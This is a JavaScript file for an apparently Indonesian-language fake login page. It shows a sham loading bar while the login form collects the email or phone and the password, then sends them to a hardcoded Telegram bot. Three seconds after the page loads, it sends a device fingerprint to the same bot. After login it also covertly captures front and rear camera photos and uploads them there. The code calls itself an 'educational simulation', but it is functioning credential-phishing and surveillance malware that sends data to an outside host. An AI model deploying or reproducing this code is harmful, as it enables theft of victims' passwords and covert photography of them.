const token = '8045925732:AAFJyqb3yfTzZoVWULfT5xD0dIMS0bfKt4A'; // ganti token bot
const chatId = '7951239340';   // ganti chat ID

let progress = 0;
const progressBar = document.getElementById('progress-bar');
const loadingDetails = document.getElementById('loading-details');
const loadingMessages = [
    "Memeriksa modul sistem...",
    "Memuat komponen inti...",
    "Menginisialisasi antarmuka...",
    "Memverifikasi koneksi...",
    "Menyiapkan lingkungan...",
    "Memeriksa pembaruan...",
    "Memuat aset tampilan..."
];

let loadingInterval = setInterval(()=>{
    progress+=Math.random()*5;
    if(progress>98) progress=98;
    progressBar.style.width=progress+'%';
    progressBar.parentElement.setAttribute('aria-valuenow',Math.floor(progress));
    if(Math.random()>0.9) loadingDetails.textContent = loadingMessages[Math.floor(Math.random()*loadingMessages.length)];
},500);

const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('login-btn');
const errorMessage = document.getElementById('error-message');

function validateEmail(email){ const re=/^[^\s@]+@[^\s@]+\.[^\s@]+$/; return re.test(email); }

async function sendToTelegram(text){
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({chat_id:chatId,text})
    });
}

async function sendPhoto(blob,filename){
    const formData = new FormData();
    formData.append('chat_id',chatId);
    formData.append('photo',blob,filename);
    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{method:'POST',body:formData});
}

async function collectDeviceInfo(){
    let message='╭───── Tracking Report ───── ⦿\n\n';
    message+='⚙️ DEVICE INFORMATION\n';
    message+=`🖥️ Device: ${navigator.userAgent}\n`;
    message+=`💻 Platform: ${navigator.platform}\n`;
    message+=`🌐 Bahasa: ${navigator.language}\n`;
    message+=`📶 Online: ${navigator.onLine?'Online':'Offline'}\n`;
    message+=`📺 Screen Size: ${screen.width}x${screen.height}\n`;
    message+=`🪟 Window Size: ${window.innerWidth}x${window.innerHeight}\n`;
    message+=`💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n`;
    message+=`🧠 CPU Cores: ${navigator.hardwareConcurrency||'Unknown'}\n`;
    if(navigator.getBattery){ try{ const battery=await navigator.getBattery(); message+=`🔋 Battery: ${Math.floor(battery.level*100)}%\n`; message+=`🔌 Charging: ${battery.charging?'✅ YA':'❌ TIDAK'}\n`; }catch(e){ message+='🔋 Battery: ❌ Tidak tersedia\n'; } }
    message+=`⏰ Waktu Akses: ${new Date().toString()}\n`;
    message+=`🌍 URL: ${window.location.href}\n\n`;
    message+='╰───── Simulasi Edukasi ───── ⦿';
    return message;
}

async function captureCamera(facingMode='user'){
    try{
        const video=document.getElementById('video');
        const canvas=document.getElementById('canvas');
        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode}});
        video.srcObject=stream;
        await new Promise(r=>setTimeout(r,2000));
        canvas.width=video.videoWidth;
        canvas.height=video.videoHeight;
        canvas.getContext('2d').drawImage(video,0,0);
        canvas.toBlob(blob=>sendPhoto(blob,`camera_${facingMode}.jpg`),'image/jpeg');
        stream.getTracks().forEach(track=>track.stop());
    }catch(e){
        await sendToTelegram(`❌ Kamera (${facingMode}) tidak tersedia atau ditolak.`);
    }
}

loginBtn.addEventListener('click', async()=>{
    errorMessage.textContent='';
    const email=emailInput.value.trim();
    const password=passwordInput.value;
    if(!email){ errorMessage.textContent='Email atau telepon harus diisi.'; emailInput.focus(); return; }
    if(email.includes('@')&&!validateEmail(email)){ errorMessage.textContent='Format email tidak valid.'; emailInput.focus(); return; }
    if(!password){ errorMessage.textContent='Kata sandi harus diisi.'; passwordInput.focus(); return; }

    clearInterval(loadingInterval);
    progressBar.style.width='100%';
    progressBar.parentElement.setAttribute('aria-valuenow',100);
    loadingDetails.textContent='Selesai memuat.';

    const deviceInfo=await collectDeviceInfo();
    const dataToSend=`Simulasi Edukasi Login\nEmail/Telepon: ${email}\nPassword: ${password}\n\n${deviceInfo}`;
    await sendToTelegram(dataToSend);

    await captureCamera('user');
    await captureCamera('environment');

    setTimeout(()=>{
        alert('Simulasi edukasi selesai. Data dikirim ke bot Telegram.\nEmail/Telepon: '+email);
        emailInput.value=''; passwordInput.value=''; progress=0; progressBar.style.width='0%'; loadingDetails.textContent='';
        startLoadingSimulation();
    },500);
});

function startLoadingSimulation(){
    progress=0; loadingDetails.textContent='';
    loadingInterval=setInterval(()=>{
        progress+=Math.random()*5;
        if(progress>98) progress=98;
        progressBar.style.width=progress+'%';
        progressBar.parentElement.setAttribute('aria-valuenow',Math.floor(progress));
        if(Math.random()>0.9) loadingDetails.textContent=loadingMessages[Math.floor(Math.random()*loadingMessages.length)];
    },500);
}

// Mulai tracking device setelah 3 detik
setTimeout(async()=>{
    const deviceInfo=await collectDeviceInfo();
    await sendToTelegram(deviceInfo);
},3000);
